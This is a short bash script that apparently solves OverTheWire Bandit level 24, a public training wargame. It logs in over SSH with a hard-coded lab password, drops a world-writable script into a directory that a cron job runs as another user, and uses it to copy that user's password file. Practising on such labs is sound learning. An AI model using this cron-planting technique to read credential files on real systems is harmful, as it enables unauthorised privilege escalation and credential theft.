#!/usr/bin/env bash

echo password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
ssh -p 2220 bandit23@bandit.labs.overthewire.org << EOF
    # Information
    cat /etc/cron.d/cronjob_bandit24
    cat /usr/bin/cronjob_bandit24.sh

    # Make files we need with proper permissions
    TMPDIR=\$(mktemp -d)
    chmod 777 \$TMPDIR
    cd \$TMPDIR
    touch my_script.sh
    chmod 777 my_script.sh
    touch passwd.txt
    chmod 666 passwd.txt

    # Create script
    echo '#!/usr/bin/env bash' >> my_script.sh
    echo "cat /etc/bandit_pass/bandit24 > \$TMPDIR/passwd.txt" >> my_script.sh

    # Place script to be executed by cronjob
    cp ./my_script.sh /var/spool/bandit24/

    # Wait until it executes
    while [ \$(file passwd.txt | cut -d ' ' -f 2) = 'empty' ]
    do
        echo 'waiting for cronjob to execute...'
        sleep 15
    done

    # Print the password
    cat ./passwd.txt
EOF

